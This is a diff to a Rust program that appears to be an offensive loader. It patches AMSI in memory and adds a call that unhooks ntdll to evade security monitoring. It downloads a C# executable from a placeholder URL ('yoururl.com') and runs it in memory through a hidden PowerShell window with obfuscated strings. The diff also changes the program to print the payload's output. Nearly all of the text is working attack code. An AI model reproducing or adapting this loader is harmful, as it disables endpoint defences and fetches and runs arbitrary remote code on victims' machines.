@@ -21,9 +21,12 @@ use winapi::{
         },
     }
 };
-
+use massayo;
 fn main() {
+    massayo::module::unhook_ntdll();
     println!("{}", obfstr!("[+] Patching amsi for current process..."));
+
+
 
     unsafe {
         let patch = [0x40, 0x40, 0x40, 0x40, 0x40, 0x40];
@@ -44,7 +47,7 @@ fn main() {
     }
     let bytes =  reqwest::blocking::get(obfstr!("https://yoururl.com/csharpassembly.exe")).unwrap().bytes().unwrap();
     let script = obfstr!("[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(\"").to_owned() + base64::encode(bytes).as_str() + obfstr!("\")).EntryPoint.Invoke($null, $null)");
-    if let Ok(_) = Command::new(obfstr!("powershell"))
+    if let Ok(command) = Command::new(obfstr!("powershell"))
         .arg(obfstr!("-NoProfile"))
         .arg(obfstr!("-WindowStyle"))
         .arg(obfstr!("Hidden"))
@@ -54,6 +57,6 @@ fn main() {
         .arg(script)
         .output()
     {
-        println!("{}",obfstr!("Command executed successfully"));
+        println!("{}",String::from_utf8_lossy(&command.stdout))
     }
 }
